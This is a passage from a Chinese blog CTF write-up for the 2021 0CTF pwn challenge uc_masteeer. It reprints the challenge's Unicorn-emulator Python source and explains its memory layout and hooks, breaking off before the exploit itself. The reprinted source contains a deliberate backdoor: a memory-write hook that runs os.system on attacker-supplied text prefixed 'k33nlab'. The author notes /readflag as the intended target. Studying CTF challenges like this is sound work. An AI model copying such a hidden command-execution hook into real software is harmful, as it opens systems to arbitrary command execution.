@@ -1,0 +1,1316 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="utf-8">
+  <title>2021-0CTF-uc_masteeer | t1an5t&#39;s Treasure</title>
+  <meta name="keywords" content=" pwnable ">
+  <meta name="description" content="2021-0CTF-uc_masteeer | t1an5t&#39;s Treasure">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="description" content="分析基本流程和uc_masteeer完全一致，可以先看uc_masteeer的wp 不过有些地方稍微调整了一下： - uc.mem_write(STACK, p64(CODE + 0x1000) + p64(CODE + 0x2000) + p64(CODE)) + uc.mem_write(CODE + 0x800, p64(CODE + 0xff0) + p64(CODE + 0x2000)">
+<meta name="keywords" content="pwnable">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2021-0CTF-uc_goood">
+<meta property="og:url" content="http://tianstcht.github.io/2021-0CTF-uc_goood/index.html">
+<meta property="og:site_name" content="t1an5t&#39;s Treasure">
+<meta property="og:description" content="分析基本流程和uc_masteeer完全一致，可以先看uc_masteeer的wp 不过有些地方稍微调整了一下： - uc.mem_write(STACK, p64(CODE + 0x1000) + p64(CODE + 0x2000) + p64(CODE)) + uc.mem_write(CODE + 0x800, p64(CODE + 0xff0) + p64(CODE + 0x2000)">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="http://tianstcht.github.io/2021-0CTF-uc_goood/image-20210707151946700.png">
+<meta property="og:image" content="http://tianstcht.github.io/2021-0CTF-uc_goood/image-20210707152544091.png">
+<meta property="og:image" content="http://tianstcht.github.io/2021-0CTF-uc_goood/image-20210707152638285.png">
+<meta property="og:updated_time" content="2021-07-07T07:26:45.243Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="2021-0CTF-uc_goood">
+<meta name="twitter:description" content="分析基本流程和uc_masteeer完全一致，可以先看uc_masteeer的wp 不过有些地方稍微调整了一下： - uc.mem_write(STACK, p64(CODE + 0x1000) + p64(CODE + 0x2000) + p64(CODE)) + uc.mem_write(CODE + 0x800, p64(CODE + 0xff0) + p64(CODE + 0x2000)">
+<meta name="twitter:image" content="http://tianstcht.github.io/2021-0CTF-uc_goood/image-20210707151946700.png">
+
+<link rel="alternate" href="/atom.xml" title="t1an5t&#39;s Treasure" type="application/atom+xml">
+
+
+<link rel="icon" href="/img/djcx.jpg">
+
+<link href="/css/style.css?v=1.0.1" rel="stylesheet">
+
+<link href="/css/hl_theme/atom-dark.css?v=1.0.1" rel="stylesheet">
+
+<link href="//cdn.bootcss.com/animate.css/3.5.2/animate.min.css" rel="stylesheet">
+<link href="//cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
+
+<script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
+<script src="/js/jquery.autocomplete.min.js?v=1.0.1"></script>
+
+<script src="//cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
+<script>
+    hljs.initHighlightingOnLoad();
+</script>
+
+<script src="//cdn.bootcss.com/nprogress/0.2.0/nprogress.min.js"></script>
+
+
+
+<script src="//cdn.bootcss.com/jquery-cookie/1.4.1/jquery.cookie.min.js"></script>
+
+<script src="/js/iconfont.js?v=1.0.1"></script>
+
+</head>
+<div style="display: none">
+  <input class="theme_disqus_on" value="false">
+  <input class="theme_preload_comment" value="false">
+  <input class="theme_blog_path" value>
+</div>
+
+<body>
+<aside class="nav">
+    <div class="nav-left">
+        <a href="/" class="avatar_target">
+    <img class="avatar" src="/img/djcx.jpg" />
+</a>
+<div class="author">
+    <span>t1an5t</span>
+</div>
+
+<div class="icon">
+    
+        
+        <a title="github" href="https://github.com/tianstcht" target="_blank">
+            
+                <svg class="iconfont-svg" aria-hidden="true">
+                    <use xlink:href="#icon-github"></use>
+                </svg>
+            
+        </a>
+        
+    
+        
+        <a title="email" href="mailto:tianstcht@gmail.com" target="_blank">
+            
+                <svg class="iconfont-svg" aria-hidden="true">
+                    <use xlink:href="#icon-email"></use>
+                </svg>
+            
+        </a>
+        
+    
+        
+        <a title="qq" href="http://wpa.qq.com/msgrd?v=3&uin=1037178204&site=qq&menu=yes" target="_blank">
+            
+                <svg class="iconfont-svg" aria-hidden="true">
+                    <use xlink:href="#icon-qq"></use>
+                </svg>
+            
+        </a>
+        
+    
+</div>
+
+
+
+
+<ul>
+    <li><div class="all active">全部文章<small>(27)</small></div></li>
+    
+        
+            
+            <li><div data-rel="CTF">CTF<small>(4)</small></div>
+                
+            </li>
+            
+        
+    
+        
+            
+            <li><div data-rel="PWN">PWN<small>(11)</small></div>
+                
+            </li>
+            
+        
+    
+        
+            
+            <li><div data-rel="RE">RE<small>(1)</small></div>
+                
+            </li>
+            
+        
+    
+        
+            
+            <li><div data-rel="NOTES">NOTES<small>(3)</small></div>
+                
+            </li>
+            
+        
+    
+        
+            
+            <li><div data-rel="QEMU">QEMU<small>(4)</small></div>
+                
+            </li>
+            
+        
+    
+        
+            
+            <li><div data-rel="TIPS">TIPS<small>(3)</small></div>
+                
+            </li>
+            
+        
+    
+        
+            
+            <li><div data-rel="ME">ME<small>(1)</small></div>
+                
+            </li>
+            
+        
+    
+</ul>
+<div class="left-bottom">
+    <div class="menus">
+    
+    
+    
+    </div>
+    <div><a class="about  hasFriend  site_url"  href="/">关于</a><a style="width: 50%"  class="friends">友链</a></div>
+</div>
+<input type="hidden" id="yelog_site_posts_number" value="27">
+
+<div style="display: none">
+    <span id="busuanzi_value_site_uv"></span>
+    <span id="busuanzi_value_site_pv"></span>
+</div>
+
+    </div>
+    <div class="nav-right">
+        <div class="friends-area">
+    <div class="friends-title">
+        友情链接
+        <i class="back-title-list"></i>
+    </div>
+    <div class="friends-content">
+        <ul>
+            
+            <li><a target="_blank" href="http://handsomedog.top/">WangTsiAo</a></li>
+            
+            <li><a target="_blank" href="http://http://igml.top/">gml</a></li>
+            
+        </ul>
+    </div>
+</div>
+        <div class="title-list">
+    <form onkeydown="if(event.keyCode === 13){return false;}">
+        <input id="local-search-input" class="search" type="text" placeholder="Search..." />
+        <i class="cross"></i>
+        <span>
+            <label for="tagswitch">Tags:</label>
+            <input id="tagswitch" type="checkbox" style="display: none" />
+            <i id="tagsWitchIcon"></i>
+        </span>
+    </form>
+    <div class="tags-list">
+    
+    <li class="article-tag-list-item">
+        <a class="color3">pwnable</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color4">ctf</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color5">2019</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color3">reverse</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color3">writeup</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color4">elf</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color2">kernel</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color5">qemu</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color1">glibc</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color3">tw</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color4">pwntools</a>
+    </li>
+    
+    <div class="clearfix"></div>
+</div>
+
+    
+    <nav id="title-list-nav">
+        
+        <a  class="CTF "
+           href="/2019-ByteCTF-writeup-PWN/"
+           data-tag="pwnable,ctf,2019"
+           data-author="" >
+            <span class="post-title" title="2019-ByteCTF-writeup-PWN">2019-ByteCTF-writeup-PWN</span>
+            <span class="post-date" title="2019-09-19 22:33:33">2019/09/19</span>
+        </a>
+        
+        <a  class="PWN "
+           href="/2019-DEFCON-CTF-babyheap/"
+           data-tag="pwnable"
+           data-author="" >
+            <span class="post-title" title="2019-DEFCON-CTF-babyheap">2019-DEFCON-CTF-babyheap</span>
+            <span class="post-date" title="2020-02-09 11:19:00">2020/02/09</span>
+        </a>
+        
+        <a  class="CTF "
+           href="/2019-CISCN-东北赛区线下赛-writeup-PWN/"
+           data-tag="pwnable,ctf"
+           data-author="" >
+            <span class="post-title" title="2019-CISCN-东北赛区线下赛-writeup-PWN">2019-CISCN-东北赛区线下赛-writeup-PWN</span>
+            <span class="post-date" title="2019-06-23 21:13:37">2019/06/23</span>
+        </a>
+        
+        <a  class="CTF "
+           href="/2019-NEX招新赛-writeup-PWN/"
+           data-tag="pwnable,ctf"
+           data-author="" >
+            <span class="post-title" title="2019-NEX招新赛-writeup-PWN">2019-NEX招新赛-writeup-PWN</span>
+            <span class="post-date" title="2019-10-27 21:52:33">2019/10/27</span>
+        </a>
+        
+        <a  class="PWN "
+           href="/2019-ROAR-CTF-easy_heap/"
+           data-tag="pwnable"
+           data-author="" >
+            <span class="post-title" title="2019-ROAR-CTF-easy_heap">2019-ROAR-CTF-easy_heap</span>
+            <span class="post-date" title="2020-02-06 10:52:00">2020/02/06</span>
+        </a>
+        
+        <a  class="PWN "
+           href="/2019-ROAR-CTF-ez_op/"
+           data-tag="pwnable"
+           data-author="" >
+            <span class="post-title" title="2019-ROAR-CTF-ez_op">2019-ROAR-CTF-ez_op</span>
+            <span class="post-date" title="2020-02-07 11:02:00">2020/02/07</span>
+        </a>
+        
+        <a  class="PWN "
+           href="/2019-ROAR-CTF-realloc_magic/"
+           data-tag="pwnable"
+           data-author="" >
+            <span class="post-title" title="2019-ROAR-CTF-realloc_magic">2019-ROAR-CTF-realloc_magic</span>
+            <span class="post-date" title="2020-02-07 11:02:00">2020/02/07</span>
+        </a>
+        
+        <a  class="PWN "
+           href="/2020-Balsn-CTF-dairy/"
+           data-tag="pwnable"
+           data-author="" >
+            <span class="post-title" title="2020-Balsn-CTF-dairy">2020-Balsn-CTF-dairy</span>
+            <span class="post-date" title="2020-11-17 19:01:00">2020/11/17</span>
+        </a>
+        
+        <a  class="RE "
+           href="/2020-网络安全公益赛-writeup-RE/"
+           data-tag="reverse,writeup"
+           data-author="" >
+            <span class="post-title" title="2020-网络安全公益赛-writeup-RE">2020-网络安全公益赛-writeup-RE</span>
+            <span class="post-date" title="2020-02-26 23:01:00">2020/02/26</span>
+        </a>
+        
+        <a  class="PWN "
+           href="/2020-西湖论剑-final-husk/"
+           data-tag="pwnable"
+           data-author="" >
+            <span class="post-title" title="2020-西湖论剑-final-husk">2020-西湖论剑-final-husk</span>
+            <span class="post-date" title="2020-11-14 23:01:00">2020/11/14</span>
+        </a>
+        
+        <a  class="CTF "
+           href="/2020-高校战疫-writeup-PWN/"
+           data-tag="pwnable,writeup"
+           data-author="" >
+            <span class="post-title" title="2020-高校战疫-writeup-PWN">2020-高校战疫-writeup-PWN</span>
+            <span class="post-date" title="2020-03-09 22:22:00">2020/03/09</span>
+        </a>
+        
+        <a  class="PWN "
+           href="/2021-0CTF-uc_goood/"
+           data-tag="pwnable"
+           data-author="" >
+            <span class="post-title" title="2021-0CTF-uc_goood">2021-0CTF-uc_goood</span>
+            <span class="post-date" title="2021-07-06 10:01:00">2021/07/06</span>
+        </a>
+        
+        <a  class="PWN "
+           href="/2021-0CTF-uc_masteeer/"
+           data-tag="pwnable"
+           data-author="" >
+            <span class="post-title" title="2021-0CTF-uc_masteeer">2021-0CTF-uc_masteeer</span>
+            <span class="post-date" title="2021-07-06 10:01:00">2021/07/06</span>
+        </a>
+        
+        <a  class="NOTES "
+           href="/ELF文件在加载过程中需要关注的部分/"
+           data-tag="elf"
+           data-author="" >
+            <span class="post-title" title="ELF文件在加载过程中需要关注的部分">ELF文件在加载过程中需要关注的部分</span>
+            <span class="post-date" title="2020-02-06 18:01:20">2020/02/06</span>
+        </a>
+        
+        <a  class="PWN "
+           href="/KERNEL-CSAW-2010-kernel/"
+           data-tag="pwnable,kernel"
+           data-author="" >
+            <span class="post-title" title="KERNEL-CSAW-2010-kernel">KERNEL-CSAW-2010-kernel</span>
+            <span class="post-date" title="2019-06-20 19:42:11">2019/06/20</span>
+        </a>
+        
+        <a  class="QEMU "
+           href="/Q之逃逸-叁之型-HITB-CTF-2017-babyqemu/"
+           data-tag="pwnable,qemu"
+           data-author="" >
+            <span class="post-title" title="Q之逃逸-叁之型-HITB-CTF-2017-babyqemu">Q之逃逸-叁之型-HITB-CTF-2017-babyqemu</span>
+            <span class="post-date" title="2020-03-05 20:49:00">2020/03/05</span>
+        </a>
+        
+        <a  class="QEMU "
+           href="/Q之逃逸-壹之型-Blizzard-CTF-2017-Strng/"
+           data-tag="pwnable,qemu"
+           data-author="" >
+            <span class="post-title" title="Q之逃逸-壹之型-Blizzard-CTF-2017-Strng">Q之逃逸-壹之型-Blizzard-CTF-2017-Strng</span>
+            <span class="post-date" title="2020-03-04 20:19:00">2020/03/04</span>
+        </a>
+        
+        <a  class="QEMU "
+           href="/Q之逃逸-贰之型-DefconQuals-2018-EC3/"
+           data-tag="pwnable,qemu"
+           data-author="" >
+            <span class="post-title" title="Q之逃逸-贰之型-DefconQuals-2018-EC3">Q之逃逸-贰之型-DefconQuals-2018-EC3</span>
+            <span class="post-date" title="2020-03-09 22:30:02">2020/03/09</span>
+        </a>
+        
+        <a  class="QEMU "
+           href="/Q之逃逸-零之型-基础知识集合/"
+           data-tag="pwnable,qemu"
+           data-author="" >
+            <span class="post-title" title="Q之逃逸-零之型-基础知识集合">Q之逃逸-零之型-基础知识集合</span>
+            <span class="post-date" title="2020-03-04 16:50:00">2020/03/04</span>
+        </a>
+        
+        <a  class="PWN "
+           href="/glibc2.32的safe-link/"
+           data-tag="pwnable"
+           data-author="" >
+            <span class="post-title" title="glibc2.32的safe-link">glibc2.32的safe-link</span>
+            <span class="post-date" title="2021-03-23 19:42:11">2021/03/23</span>
+        </a>
+        
+        <a  class="NOTES "
+           href="/glibc-malloc-c源码阅读笔记/"
+           data-tag="glibc"
+           data-author="" >
+            <span class="post-title" title="glibc-malloc.c源码阅读笔记">glibc-malloc.c源码阅读笔记</span>
+            <span class="post-date" title="2019-07-17 16:18:02">2019/07/17</span>
+        </a>
+        
+        <a  class="PWN "
+           href="/pwnab13-7w/"
+           data-tag="pwnable,tw"
+           data-author="" >
+            <span class="post-title" title="pwnab13.7w">pwnab13.7w</span>
+            <span class="post-date" title="2019-06-19 15:14:30">2019/06/19</span>
+        </a>
+        
+        <a  class="TIPS "
+           href="/pwntools的使用技巧/"
+           data-tag="pwnable,pwntools"
+           data-author="" >
+            <span class="post-title" title="pwntools的使用技巧">pwntools的使用技巧</span>
+            <span class="post-date" title="2019-06-19 15:26:27">2019/06/19</span>
+        </a>
+        
+        <a  class="TIPS "
+           href="/pwn里的一些patch心得/"
+           data-tag="pwnable"
+           data-author="" >
+            <span class="post-title" title="pwn里的一些patch心得">pwn里的一些patch心得</span>
+            <span class="post-date" title="2019-06-23 21:13:57">2019/06/23</span>
+        </a>
+        
+        <a  class="ME "
+           href="/t1an5t的2020/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="t1an5t的2020">t1an5t的2020</span>
+            <span class="post-date" title="1999-01-01 15:13:07">1999/01/01</span>
+        </a>
+        
+        <a  class="TIPS "
+           href="/造轮子/"
+           data-tag="pwnable"
+           data-author="" >
+            <span class="post-title" title="造轮子">造轮子</span>
+            <span class="post-date" title="2019-06-19 15:40:33">2019/06/19</span>
+        </a>
+        
+        <a  class="NOTES "
+           href="/glibc2.30代码阅读/"
+           data-tag="glibc"
+           data-author="" >
+            <span class="post-title" title="glibc2.30代码阅读笔记">glibc2.30代码阅读笔记</span>
+            <span class="post-date" title="2020-02-14 20:26:20">2020/02/14</span>
+        </a>
+        
+    </nav>
+</div>
+    </div>
+    <div class="hide-list">
+        <div class="semicircle">
+            <div class="brackets first"><</div>
+            <div class="brackets">&gt;</div>
+        </div>
+    </div>
+</aside>
+<div class="post">
+    <div class="pjax">
+        <article id="post-2021-0CTF-uc_masteeer" class="article article-type-post" itemscope itemprop="blogPost">
+    
+        <h1 class="article-title">2021-0CTF-uc_masteeer</h1>
+    
+    <div class="article-meta">
+        
+        
+        
+        <span class="book">
+            
+                <a  data-rel="PWN">PWN</a>
+            
+        </span>
+        
+        
+        <span class="tag">
+            
+            <a class="color3">pwnable</a>
+            
+        </span>
+        
+    </div>
+    <div class="article-meta">
+        
+        创建时间:<time class="date" title='更新时间: 2021-07-07 15:15:54'>2021-07-06 10:01</time>
+        
+    </div>
+    <div class="article-meta">
+        
+        
+        <span id="busuanzi_container_page_pv">
+            阅读:<span id="busuanzi_value_page_pv">
+                <span class="count-comment">
+                    <span class="spinner">
+                      <div class="cube1"></div>
+                      <div class="cube2"></div>
+                    </span>
+                </span>
+            </span>
+        </span>
+        
+        
+    </div>
+    
+    <div class="toc-ref">
+    
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#分析"><span class="toc-text">分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#利用"><span class="toc-text">利用</span></a></li></ol>
+    
+<style>
+    .left-col .switch-btn,
+    .left-col .switch-area {
+        display: none;
+    }
+    .toc-level-3 i,
+    .toc-level-3 ol {
+        display: none !important;
+    }
+</style>
+</div>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>题目一共给了两个文件，uc_masteeer.py和syscall.py</p>
+<p>uc_masteeer.py</p>
+<pre><code class="python">#!/usr/bin/env python
+import os
+import struct
+import types
+from unicorn import *
+from unicorn.x86_const import *
+
+from syscall import hook_syscall
+
+
+CODE = 0xdeadbeef000
+STACK = 0xbabecafe000
+MAIN = b&#39;\x48\x83\xec\x20\x66\xc7\x44\x24\x0e\x00\x00\x48\x8d\x5c\x24\x0e\x48\xc7\x44\x24\x10\x00\x00\x00\x00\x48\xc7\x44\x24\x18\x00\x00\x00\x00\xb9\x44\x00\x00\x00\x48\x8d\x15\x8b\x01\x00\x00\xbe\x01\x00\x00\x00\x31\xc0\xbf\x01\x00\x00\x00\xe8\xbe\x01\x00\x00\xb9\x02\x00\x00\x00\x48\x89\xda\x31\xf6\x31\xff\x31\xc0\xe8\xab\x01\x00\x00\x8a\x44\x24\x0e\x3c\x32\x74\x39\x3c\x33\x74\x62\x3c\x31\x0f\x85\x04\x01\x00\x00\xb9\x12\x00\x00\x00\x48\x8d\x15\x35\x01\x00\x00\xbe\x01\x00\x00\x00\x31\xc0\xbf\x01\x00\x00\x00\xe8\x7a\x01\x00\x00\x48\x83\xc4\x20\x48\xbf\x00\xe0\xaf\xec\xab\x0b\x00\x00\xff\x27\xb9\x12\x00\x00\x00\x48\x8d\x15\xf6\x00\x00\x00\xbe\x01\x00\x00\x00\x31\xc0\xbf\x01\x00\x00\x00\xe8\x4d\x01\x00\x00\x48\x83\xc4\x20\x48\xbf\x00\xe0\xaf\xec\xab\x0b\x00\x00\xff\x27\xb9\x07\x00\x00\x00\x48\x8d\x15\xc2\x00\x00\x00\xbe\x01\x00\x00\x00\x31\xc0\xbf\x01\x00\x00\x00\xe8\x20\x01\x00\x00\x31\xf6\x31\xff\x48\x8d\x54\x24\x10\xb9\x08\x00\x00\x00\x31\xc0\xe8\x0b\x01\x00\x00\xb9\x07\x00\x00\x00\xbe\x01\x00\x00\x00\x31\xc0\x48\x8d\x15\x82\x00\x00\x00\xbf\x01\x00\x00\x00\xe8\xee\x00\x00\x00\x31\xf6\x31\xff\x31\xc0\x48\x8d\x54\x24\x18\xb9\x08\x00\x00\x00\xe8\xd9\x00\x00\x00\x48\x81\x7c\x24\x18\xff\x00\x00\x00\x0f\x87\xef\xfe\xff\xff\xb9\x07\x00\x00\x00\x48\x8d\x15\x41\x00\x00\x00\xbe\x01\x00\x00\x00\x31\xc0\xbf\x01\x00\x00\x00\xe8\xad\x00\x00\x00\x48\x8b\x4c\x24\x18\x31\xf6\x31\xff\x48\x8b\x54\x24\x10\x31\xc0\xe8\x98\x00\x00\x00\xe9\xb8\xfe\xff\xff\xbe\xff\x00\x00\x00\xbf\x3c\x00\x00\x00\x31\xc0\xe8\x82\x00\x00\x00\xe9\xa2\xfe\xff\xff\x64\x61\x74\x61\x3a\x20\x00\x73\x69\x7a\x65\x3a\x20\x00\x61\x64\x64\x72\x3a\x20\x00\x50\x61\x74\x68\x65\x74\x69\x63\x20\x68\x75\x6d\x61\x6e\x20\x3e\x0a\x00\x50\x6f\x77\x65\x72\x66\x75\x6c\x20\x61\x64\x6d\x69\x6e\x20\x3e\x0a\x00\x57\x65\x6c\x63\x6f\x6d\x65\x20\x74\x6f\x20\x75\x63\x5f\x6d\x61\x73\x74\x65\x65\x65\x72\x0a\x31\x2e\x20\x61\x64\x6d\x69\x6e\x20\x74\x65\x73\x74\x0a\x32\x2e\x20\x75\x73\x65\x72\x20\x74\x65\x73\x74\x0a\x33\x2e\x20\x70\x61\x74\x63\x68\x20\x64\x61\x74\x61\x0a\x3f\x3a\x20\x00\x48\x89\xf8\x48\x89\xf7\x48\x89\xd6\x48\x89\xca\x4d\x89\xc2\x4d\x89\xc8\x4c\x8b\x4c\x24\x08\x0f\x05\xc3&#39;
+TAIL = b&#39;\x31\xc0\xb9\x32\x00\x00\x00\x48\x8d\x15\x55\x00\x00\x00\xbe\x01\x00\x00\x00\xbf\x01\x00\x00\x00\x48\x83\xec\x18\x66\x89\x44\x24\x0e\x31\xc0\xe8\x6d\x00\x00\x00\x31\xf6\x31\xff\x31\xc0\x48\x8d\x54\x24\x0e\xb9\x02\x00\x00\x00\xe8\x58\x00\x00\x00\x80\x7c\x24\x0e\x79\x75\x11\x48\x83\xc4\x18\x48\xbf\x00\xe0\xaf\xec\xab\x0b\x00\x00\xff\x67\x10\x31\xf6\xbf\x3c\x00\x00\x00\x31\xc0\xe8\x32\x00\x00\x00\x43\x6f\x6e\x67\x72\x61\x74\x75\x6c\x61\x74\x69\x6f\x6e\x73\x21\x20\x54\x65\x73\x74\x20\x73\x75\x63\x63\x65\x65\x64\x21\x0a\x54\x72\x79\x20\x61\x67\x61\x69\x6e\x3f\x20\x28\x79\x2f\x5b\x6e\x5d\x29\x00\x48\x89\xf8\x48\x89\xf7\x48\x89\xd6\x48\x89\xca\x4d\x89\xc2\x4d\x89\xc8\x4c\x8b\x4c\x24\x08\x0f\x05\xc3&#39;
+ADMIN = b&#39;\xb9\x10\x00\x00\x00\x48\x8d\x15\x37\x00\x00\x00\x31\xc0\xbe\x01\x00\x00\x00\xbf\x01\x00\x00\x00\x48\x83\xec\x08\xe8\x5f\x00\x00\x00\x48\x8d\x05\x2b\x00\x00\x00\x48\xa3\x33\xe2\xaf\xec\xab\x0b\x00\x00\x48\x83\xc4\x08\x48\xbf\x00\xe0\xaf\xec\xab\x0b\x00\x00\xff\x67\x08\x49\x6d\x61\x67\x69\x6e\x61\x74\x69\x6f\x6e\x20\x69\x73\x20\x00\x6b\x33\x33\x6e\x6c\x61\x62\x65\x63\x68\x6f\x20\x27\x6d\x6f\x72\x65\x20\x69\x6d\x70\x6f\x72\x74\x61\x6e\x74\x20\x74\x68\x61\x6e\x20\x6b\x6e\x6f\x77\x6c\x65\x64\x67\x65\x2e\x27\x00\x48\x89\xf8\x48\x89\xf7\x48\x89\xd6\x48\x89\xca\x4d\x89\xc2\x4d\x89\xc8\x4c\x8b\x4c\x24\x08\x0f\x05\xc3&#39;.ljust(0x1000, b&#39;\xf4&#39;)
+admin_offset = CODE + 0x6b - 5
+writable = []
+is_admin = False
+
+
+def admin_hook(uc, address, size, user_data):
+    global is_admin
+    is_admin = True
+    uc.mem_write(CODE + 0x1000, ADMIN)
+
+
+def hook_mem_access(uc, access, address, size, value, user_data):
+    global is_admin
+    if is_admin and address == 0xbabecafe233:
+        is_admin = False
+        cmd = uc.mem_read(value, 0x100)
+        if cmd.startswith(b&#39;k33nlab&#39;):
+            os.system(cmd[7:cmd.index(0)].decode(&#39;utf-8&#39;))
+
+
+def _safe_mem_write(self, address, data):
+    end = address + len(data)
+    for page in writable:
+        if address &gt;= page and end &lt;= page + 0x1000:
+            self.mem_write(address, data)
+            break
+    else:
+        raise UcError(UC_ERR_WRITE_PROT)
+
+
+def p64(n):
+    return struct.pack(&#39;&lt;Q&#39;, n)
+
+
+def init(uc):
+    global writable
+
+    uc.safe_mem_write = types.MethodType(_safe_mem_write, uc)
+
+    uc.mem_map(CODE, 0x1000, UC_PROT_READ | UC_PROT_EXEC)
+    uc.mem_write(CODE, b&#39;\x90&#39; * 0x1000)
+    uc.mem_map(CODE + 0x1000, 0x1000, UC_PROT_ALL)
+    uc.mem_write(CODE + 0x1000, b&#39;\x90&#39; * 0x1000)
+    uc.mem_map(CODE + 0x2000, 0x1000, UC_PROT_READ | UC_PROT_EXEC)
+    uc.mem_write(CODE + 0x2000, b&#39;\x90&#39; * 0x1000)
+    uc.mem_write(CODE, MAIN)
+    uc.mem_write(CODE + 0x2000, TAIL)
+
+    uc.mem_map(STACK, 0x1000, UC_PROT_READ | UC_PROT_WRITE)
+    uc.reg_write(UC_X86_REG_RSP, STACK + 0xf00)
+    uc.mem_write(STACK, p64(CODE + 0x1000) + p64(CODE + 0x2000) + p64(CODE))
+
+    writable = (CODE + 0x1000, STACK)
+
+    uc.hook_add(UC_HOOK_INSN, hook_syscall, None, 1, 0, UC_X86_INS_SYSCALL)
+    uc.hook_add(UC_HOOK_CODE, admin_hook, None, admin_offset, admin_offset + 1)
+    uc.hook_add(UC_HOOK_MEM_WRITE, hook_mem_access)
+
+
+def play():
+    uc = Uc(UC_ARCH_X86, UC_MODE_64)
+    init(uc)
+
+    data = os.read(0, 0x1000 - 0xd)
+    data += b&#39;\x48\xbf\x00\xe0\xaf\xec\xab\x0b\x00\x00\xff\x67\x08&#39;
+    uc.mem_write(CODE + 0x1000, data)
+
+    try:
+        uc.emu_start(CODE, CODE + 0x3000 - 1)
+    except UcError as e:
+        print(&quot;error...&quot;)
+
+
+if __name__ == &#39;__main__&#39;:
+    play()</code></pre>
+<p>syscall.py</p>
+<pre><code class="python">#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+from unicorn import *
+from unicorn.x86_const import *
+import os.path
+import sys
+
+
+def hook_syscall(uc, user_data):
+    arg_regs = [UC_X86_REG_RDI, UC_X86_REG_RSI, UC_X86_REG_RDX, UC_X86_REG_R10, UC_X86_REG_R8, UC_X86_REG_R9]
+    rax = uc.reg_read(UC_X86_REG_RAX)
+    if rax in SYSCALL_MAP.keys():
+        ff, n = SYSCALL_MAP[rax]
+        args = []
+        while n &gt; 0:
+            args.append(uc.reg_read(arg_regs.pop(0)))
+            n -= 1
+        try:
+            ret = ff(uc, *args) &amp; 0xffffffffffffffff
+        except Exception as e:
+            uc.emu_stop()
+            return
+    else:
+        ret = 0xffffffffffffffff
+    uc.reg_write(UC_X86_REG_RAX, ret)
+
+
+def sys_read(uc, fd, buf_addr, size):
+    if fd != 0:
+        return -1
+    data = &#39;&#39;
+    data = os.read(0, size)
+    assert len(data) &lt;= size &lt; 0x100
+    uc.safe_mem_write(buf_addr, data)
+    return len(data)
+
+
+def sys_write(uc, fd, buf_addr, size):
+    if fd != 1:
+        return -1
+    data = uc.mem_read(buf_addr, size)
+    assert len(data) &lt;= size &lt; 0x100
+    sys.stdout.buffer.write(data)
+    sys.stdout.buffer.flush()
+    return len(data)
+
+
+def sys_exit(uc, error_code):
+    uc.emu_stop()
+    return error_code
+
+
+SYSCALL_MAP = {
+    0: (sys_read, 3),
+    1: (sys_write, 3),
+    60: (sys_exit, 1),
+}</code></pre>
+<p>先看主体的map部分，可以知道，程序中有三段代码，分布如下图所示，每部分的间隔相差0x1000</p>
+<p><img src="/2021-0CTF-uc_masteeer/image-20210707150827156.png" alt="image-20210707150827156"></p>
+<p>再来关注一下hook部分：</p>
+<pre><code class="python"># UC_HOOK_INSN, UC_X86_INS_SYSCALL: 执行syscal的时候触发，end_addr &lt; start_addr，所以对于所有地址都生效
+uc.hook_add(UC_HOOK_INSN, hook_syscall, None, 1, 0, UC_X86_INS_SYSCALL)
+
+# UC_HOOK_CODE: 执行地址在指定范围之间就会触发admin_hook，这里范围是admin_offset-admin_offset+1
+uc.hook_add(UC_HOOK_CODE, admin_hook, None, admin_offset, admin_offset + 1)
+
+# 向内存中写入的操作会触发hook_mem_access
+uc.hook_add(UC_HOOK_MEM_WRITE, hook_mem_access)</code></pre>
+<p>所以只看uc_masteer.py，看到的基本流程如下：</p>
+<ul>
+<li>MAIN，TAIL被填充到CODE和CODE+0x1000的位置，然后CODE其他区域全部用nop来填充占位</li>
+<li>p64(CODE + 0x1000),  p64(CODE + 0x2000), p64(CODE)的地址被依次放入栈中</li>
+<li>输入一段代码，结尾被填充一段固定代码，我们可以称其为USER，然后写到CODE+0x1000的位置</li>
+<li>程序开始从CODE的位置执行</li>
+<li>如果执行syscall指令，触发hook_syscall，主要做了系统调用的限制（read/write/exit）以及程序运行时是否向非法地址进行了写入</li>
+<li>RIP执行到admin_offset-admin_offset+1的位置，会触发admin_hook<ul>
+<li>is_admin = True</li>
+<li>ADMIn代码被覆盖到CODE+0x1000的位置，覆盖了我们一开始输入的USER</li>
+</ul>
+</li>
+<li>执行向内存中写入的指令时，会触发hook_mem_access<ul>
+<li>满足is_admin and address == 0xbabecafe233条件进入后门</li>
+<li>is_admin = False</li>
+<li>会把value当成地址，进行uc.mem_read，如果满足前缀为k33nlab，就可以执行后面跟着的任何命令，这里我们的预期肯定是/readflag</li>
+</ul>
+</li>
+</ul>
+<p>之后，借助反编译引擎capstone来看看MAIN，TAIL，ADMIN里面的具体代码（其实用pwntools自带的disasm效果会更好）</p>
+<pre><code class="python">from capstone import *
+
+CODE = 0xdeadbeef000
+MAIN = b&quot;asm code&quot;
+
+md = Cs(CS_ARCH_X86, CS_MODE_64)
+md.detail = True
+
+for i in md.disasm(MAIN[:], CODE):
